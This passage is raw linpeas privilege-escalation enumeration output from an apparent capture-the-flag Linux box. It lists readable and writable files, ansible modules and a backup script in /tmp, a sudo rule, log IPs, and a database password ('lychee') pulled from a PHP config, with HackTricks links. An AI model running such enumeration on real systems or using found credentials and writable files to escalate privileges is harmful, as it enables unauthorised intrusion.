[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2319 Apr 18  2022 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2022 /etc/skel/.profile
lrwxrwxrwx 1 root root 41 Mar 13  2023 /etc/systemd/system/vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
lrwxrwxrwx 1 bismuth bismuth 9 Nov  7  2022 /home/bismuth/.bash_history -> /dev/null
Searching possible passwords inside /home/bismuth/.bash_history (limit 100)

-rw-r--r-- 1 bismuth bismuth 3771 Nov  7  2022 /home/bismuth/.bashrc
-rw-r--r-- 1 bismuth bismuth 655 Nov  7  2022 /home/bismuth/.profile
-rw-r--r-- 1 bismuth bismuth 0 Nov  7  2022 /home/bismuth/.sudo_as_admin_successful
-rwxr-xr-x 1 root root 1814 Mar 10  2021 /usr/lib/initramfs-tools/etc/dhcp/dhclient-enter-hooks.d/config
-rw-r--r-- 1 root root 3106 Aug 14  2019 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2889 Dec  4  2017 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 2778 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 11 Feb  4  2018 /usr/share/ieee-data/.lastupdate
-rw-r--r-- 1 root root 820 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 2839 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/selinux/mdp/.mdp.cmd
-rw-r--r-- 1 root root 3239 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/selinux/genheaders/.genheaders.cmd
-rw-r--r-- 1 root root 2391 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 4495 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/.extract-cert.cmd
-rw-r--r-- 1 root root 2380 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 3253 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 3568 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 3347 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/genksyms/.lex.lex.o.cmd
-rw-r--r-- 1 root root 2481 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/genksyms/.parse.tab.o.cmd
-rw-r--r-- 1 root root 153 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/genksyms/.genksyms.cmd
-rw-r--r-- 1 root root 2719 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/genksyms/.genksyms.o.cmd
-rw-r--r-- 1 root root 1193 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/basic/.bin2c.cmd
-rw-r--r-- 1 root root 4268 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/basic/.fixdep.cmd
-rw-r--r-- 1 root root 3387 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/.recordmcount.cmd
-rw-r--r-- 1 root root 3972 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/.insert-sys-cert.cmd
-rw-r--r-- 1 root root 3485 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/mod/.file2alias.o.cmd
-rw-r--r-- 1 root root 5467 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/mod/.devicetable-offsets.s.cmd
-rw-r--r-- 1 root root 2459 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/mod/.empty.o.cmd
-rw-r--r-- 1 root root 2537 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/mod/.mk_elfconfig.cmd
-rw-r--r-- 1 root root 129 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/mod/.modpost.cmd
-rw-r--r-- 1 root root 104 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/mod/.elfconfig.h.cmd
-rw-r--r-- 1 root root 4451 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/mod/.sumversion.o.cmd
-rw-r--r-- 1 root root 4622 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/mod/.modpost.o.cmd
-rw-r--r-- 1 root root 4917 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/kconfig/.zconf.tab.o.cmd
-rw-r--r-- 1 root root 110 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/kconfig/.conf.cmd
-rw-r--r-- 1 root root 3755 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/kconfig/.conf.o.cmd
-rw-r--r-- 1 root root 5133 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/scripts/.sign-file.cmd
-rw-r--r-- 1 root root 340 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
-rw-r--r-- 1 root root 320 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
-rw-r--r-- 1 root root 315 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
-rw-r--r-- 1 root root 402 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
-rw-r--r-- 1 root root 316 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
-rw-r--r-- 1 root root 292 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
-rw-r--r-- 1 root root 320 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
-rw-r--r-- 1 root root 292 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
-rw-r--r-- 1 root root 53296 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/kernel/.asm-offsets.s.cmd
-rw-r--r-- 1 root root 1379 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
-rw-r--r-- 1 root root 3713 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/purgatory/.string.o.cmd
-rw-r--r-- 1 root root 6314 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/purgatory/.sha256.o.cmd
-rw-r--r-- 1 root root 1329 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/purgatory/.entry64.o.cmd
-rw-r--r-- 1 root root 1309 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/purgatory/.stack.o.cmd
-rw-r--r-- 1 root root 155 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd
-rw-r--r-- 1 root root 360 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/purgatory/.purgatory.ro.cmd
-rw-r--r-- 1 root root 3727 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/purgatory/.purgatory.o.cmd
-rw-r--r-- 1 root root 3342 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/tools/.relocs_common.o.cmd
-rw-r--r-- 1 root root 3362 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/tools/.relocs_64.o.cmd
-rw-r--r-- 1 root root 3362 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/tools/.relocs_32.o.cmd
-rw-r--r-- 1 root root 146 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/arch/x86/tools/.relocs.cmd
-rw-r--r-- 1 root root 191013 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/.config.old
-rw-r--r-- 1 root root 12646 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/kernel/.bounds.s.cmd
-rw-r--r-- 1 root root 190889 Apr 16  2021 /usr/src/linux-headers-4.4.0-210-generic/.config
-rw-r--r-- 1 root root 962 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 5243 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/selinux/mdp/.mdp.cmd
-rw-r--r-- 1 root root 5742 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/selinux/genheaders/.genheaders.cmd
-rw-r--r-- 1 root root 3536 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 6421 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/.extract-cert.cmd
-rw-r--r-- 1 root root 3812 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 4535 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 4982 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 4582 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/genksyms/.lex.lex.o.cmd
-rw-r--r-- 1 root root 3607 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/genksyms/.parse.tab.o.cmd
-rw-r--r-- 1 root root 153 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/genksyms/.genksyms.cmd
-rw-r--r-- 1 root root 4024 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/genksyms/.genksyms.o.cmd
-rw-r--r-- 1 root root 1528 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/basic/.bin2c.cmd
-rw-r--r-- 1 root root 5474 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/basic/.fixdep.cmd
-rw-r--r-- 1 root root 4799 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/.recordmcount.cmd
-rw-r--r-- 1 root root 5401 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/.insert-sys-cert.cmd
-rw-r--r-- 1 root root 4820 Feb  3  2023 /usr/src/linux-headers-4.15.0-206-generic/scripts/mod/.file2alias.o.cmd

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
-rw-rw-r-- 1 bismuth bismuth 8641 Aug 14 04:29 /tmp/ansible_eYYcer/ansible_module_command.py
-rw-rw-r-- 1 bismuth bismuth 46540 Aug 14 04:29 /tmp/ansible_eYYcer/ansible_modlib.zip
-rw-rw-r-- 1 bismuth bismuth 8641 Aug 14 04:22 /tmp/ansible_w0mF8G/ansible_module_command.py
-rw-rw-r-- 1 bismuth bismuth 46540 Aug 14 04:22 /tmp/ansible_w0mF8G/ansible_modlib.zip
-rw-rw-r-- 1 bismuth bismuth 55 Aug 14 04:26 /tmp/backupScript.sh
-rw-r--r-- 1 root root 11 Nov  7  2022 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 569754 Nov  7  2022 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 135 Nov  7  2022 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 437 Nov  7  2022 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 21215 Mar 13  2023 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 1464 Nov  7  2022 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 51200 Nov  8  2022 /var/backups/alternatives.tar.0

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/home/bismuth
/run/lock
/run/screen
/run/screen/S-bismuth
/run/user/1000
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/tmp/ansible_eYYcer
/tmp/ansible_eYYcer/ansible_modlib.zip
/tmp/ansible_eYYcer/ansible_module_command.py
/tmp/ansible_w0mF8G
/tmp/ansible_w0mF8G/ansible_modlib.zip
/tmp/ansible_w0mF8G/ansible_module_command.py
/tmp/backupScript.sh
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1000
/tmp/.X11-unix
/tmp/.XIM-unix
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/docker/7f6cb379755d04a2501fb0bb54eb1b85d2444e7f0f79ab825e297cd1c5847c91/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/docker/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/docker/ee0338aadb08e00c1a8c3911b63df5bdaa119155a764624ad096dd3ac3dad3a1/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/containerd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by\x2duuid-7786247f\x2d7668\x2d49ef\x2daea1\x2d1e500c1a9227.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/http.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/OliveTin.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/uuidd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.service/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
/var/lib/lychee
/var/lib/lychee/data
/var/lib/lychee/data/config.php
/var/lib/lychee/uploads
/var/lib/lychee/uploads/medium
/var/lib/mysql
/var/lib/mysql/debian-5.5.flag
/var/lib/mysql/ibdata1
/var/lib/mysql/ib_logfile0
/var/lib/mysql/ib_logfile1
/var/lib/mysql/lychee
/var/lib/mysql/lychee/db.opt
/var/lib/mysql/lychee/lychee_albums.frm
/var/lib/mysql/lychee/lychee_albums.MYD
/var/lib/mysql/lychee/lychee_albums.MYI
/var/lib/mysql/lychee/lychee_log.frm
/var/lib/mysql/lychee/lychee_log.MYD
/var/lib/mysql/lychee/lychee_log.MYI
/var/lib/mysql/lychee/lychee_photos.frm
/var/lib/mysql/lychee/lychee_photos.MYD
/var/lib/mysql/lychee/lychee_photos.MYI
/var/lib/mysql/lychee/lychee_settings.frm
#)You_can_write_even_more_files_inside_last_directory
/var/lib/mysql/mysql/columns_priv.frm
/var/lib/mysql/mysql/columns_priv.MYD
/var/lib/mysql/mysql/columns_priv.MYI
/var/lib/mysql/mysql/db.frm
/var/lib/mysql/mysql/db.MYD
/var/lib/mysql/mysql/db.MYI
/var/lib/mysql/mysql/event.frm
/var/lib/mysql/mysql/event.MYD
/var/lib/mysql/mysql/event.MYI
/var/lib/mysql/mysql/func.frm
/var/lib/mysql/mysql/func.MYD
#)You_can_write_even_more_files_inside_last_directory
/var/lib/mysql/performance_schema/cond_instances.frm
/var/lib/mysql/performance_schema/db.opt
/var/lib/mysql/performance_schema/events_waits_current.frm
/var/lib/mysql/performance_schema/events_waits_history.frm
/var/lib/mysql/performance_schema/events_waits_history_long.frm
/var/lib/mysql/performance_schema/events_waits_summary_by_instance.frm
/var/lib/mysql/performance_schema/events_waits_summary_by_thread_by_event_name.frm
/var/lib/mysql/performance_schema/events_waits_summary_global_by_event_name.frm
/var/lib/mysql/performance_schema/file_instances.frm
/var/lib/mysql/performance_schema/file_summary_by_event_name.frm
/var/lib/mysql/performance_schema/file_summary_by_instance.frm
#)You_can_write_even_more_files_inside_last_directory

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group bismuth:
/dev/mqueue/linpeas.txt
/tmp/ansible_eYYcer/ansible_module_command.py
/tmp/ansible_eYYcer/ansible_modlib.zip
/tmp/ansible_w0mF8G/ansible_module_command.py
/tmp/ansible_w0mF8G/ansible_modlib.zip
/tmp/backupScript.sh
  Group adm:
  Group cdrom:
  Group dip:
  Group plugdev:
  Group lpadmin:
  Group sambashare:

[+] Searching passwords in config PHP files
$dbPassword = 'lychee'; // Password of the database

[+] Finding IPs inside logs (limit 70)
    201 /var/log/syslog:192.168.1.146
    117 /var/log/dpkg.log:1.16.04.1
    116 /var/log/syslog:192.168.1.1
     61 /var/log/dpkg.log:3.18.04.3
     50 /var/log/syslog:255.255.255.255
     39 /var/log/dpkg.log:2.18.04.6
     36 /var/log/apt/term.log:1.16.04.1
     35 /var/log/dpkg.log:1.18.04.7
     24 /var/log/dpkg.log:1.16.04.4
     23 /var/log/dpkg.log:7.18.04.2
     21 /var/log/dpkg.log:10.18.04.3
     21 /var/log/apt/term.log:3.18.04.3
     20 /var/log/dpkg.log:3.2.3.2
     20 /var/log/dpkg.log:3.16.04.5
     19 /var/log/wtmp:192.168.1.254
     19 /var/log/syslog:10.10.121.66
     18 /var/log/apt/history.log:1.16.04.1
     17 /var/log/dpkg.log:3.192.1.18
     17 /var/log/dpkg.log:1.16.04.5
     16 /var/log/dpkg.log:6.16.04.1
     14 /var/log/syslog:185.125.190.58
     14 /var/log/dpkg.log:2.16.04.2
     14 /var/log/dpkg.log:18.04.11.13
     13 /var/log/dpkg.log:2.16.04.3
     12 /var/log/syslog:185.125.190.56
     12 /var/log/dpkg.log:3.16.04.3
     12 /var/log/dpkg.log:1.18.04.14
     12 /var/log/apt/term.log:2.18.04.6
     11 /var/log/syslog:91.189.91.157
     10 /var/log/syslog:185.125.190.57
      9 /var/log/apt/term.log:7.18.04.2
      8 /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system@eecca03c86784311ae80b357bf7bc2f2-0000000000002ebc-00061fa1e20a2801.journal:10.10.121.66
      8 /var/log/apt/term.log:1.18.04.7
      7 /var/log/syslog:8.8.8.8
      7 /var/log/syslog:8.8.4.4
      7 /var/log/dpkg.log:6.18.04.2
      7 /var/log/dpkg.log:5.18.04.6
      7 /var/log/dpkg.log:1.18.04.2
      7 /var/log/dpkg.log:1.18.04.1
      7 /var/log/apt/term.log:3.2.3.2
      7 /var/log/apt/history.log:3.18.04.3
      6 /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system@eecca03c86784311ae80b357bf7bc2f2-0000000000001ac2-0005f75701ce6576.journal:255.255.255.255
      6 /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system@eecca03c86784311ae80b357bf7bc2f2-0000000000001ac2-0005f75701ce6576.journal:192.168.1.146
      6 /var/log/apt/term.log:18.04.11.13
      5 /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system@eecca03c86784311ae80b357bf7bc2f2-0000000000001ac2-0005f75701ce6576.journal:192.168.1.1
      5 /var/log/installer/status:1.16.04.1
      4 /var/log/syslog:67.220.228.86
      4 /var/log/syslog:10.10.217.19
      4 /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system.journal:10.10.121.66
      4 /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system@eecca03c86784311ae80b357bf7bc2f2-0000000000001ac2-0005f75701ce6576.journal:192.168.1.254
      4 /var/log/installer/status:1.2.3.3
      4 /var/log/apt/term.log:6.16.04.1
      4 /var/log/apt/term.log:2.16.04.3
      4 /var/log/apt/term.log:1.16.04.5
      4 /var/log/apt/term.log:10.18.04.3
      4 /var/log/apt/history.log:2.18.04.6
      4 /var/log/apt/history.log:1.18.04.7
      4 /var/log/apt/history.log:1.16.04.4
      3 /var/log/syslog:91.189.94.4
      3 /var/log/syslog:52.95.123.56
      3 /var/log/nginx/access.log:192.168.1.254
      3 /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system@eecca03c86784311ae80b357bf7bc2f2-0000000000001ac2-0005f75701ce6576.journal:8.8.8.8
      3 /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system@eecca03c86784311ae80b357bf7bc2f2-0000000000001ac2-0005f75701ce6576.journal:8.8.4.4
      3 /var/log/apt/term.log:6.18.04.2
      3 /var/log/apt/term.log:5.18.04.6
      3 /var/log/apt/term.log:3.192.1.18
      3 /var/log/apt/term.log:1.18.04.2
      3 /var/log/apt/term.log:1.18.04.14
      3 /var/log/apt/term.log:1.18.04.1
      3 /var/log/apt/history.log:7.18.04.2

[+] Finding passwords inside logs (limit 70)
Binary file /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system.journal matches
Binary file /var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/user-1000.journal matches
Binary file /var/log/syslog matches
/var/log/apt/term.log:-bismuth ALL=(ALL) NOPASSWD: /bin/ping
/var/log/apt/term.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
/var/log/apt/term.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu2.5_amd64.deb ...
/var/log/apt/term.log:Removing obsolete conffile /etc/init/passwd.conf ...
/var/log/apt/term.log:Setting up base-passwd (3.5.44) ...
/var/log/apt/term.log:Setting up passwd (1:4.5-1ubuntu2.5) ...
/var/log/apt/term.log:Unpacking base-passwd (3.5.44) over (3.5.39) ...
/var/log/apt/term.log:Unpacking passwd (1:4.5-1ubuntu2.5) over (1:4.2-3.1ubuntu5.4) ...
/var/log/auth.log:Aug 14 04:31:45 catpictures-ii sudo:  bismuth : command not allowed ; TTY=pts/4 ; PWD=/home/bismuth ; USER=root ; COMMAND=list
/var/log/auth.log:Aug 14 04:39:07 catpictures-ii sudo:  bismuth : command not allowed ; TTY=pts/4 ; PWD=/home/bismuth ; USER=root ; COMMAND=list
/var/log/auth.log:Aug 14 04:39:07 catpictures-ii sudo: pam_unix(sudo:auth): auth could not identify password for [bismuth]
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
/var/log/dpkg.log:2020-08-10 18:14:40 configure base-passwd:amd64 3.5.39 3.5.39
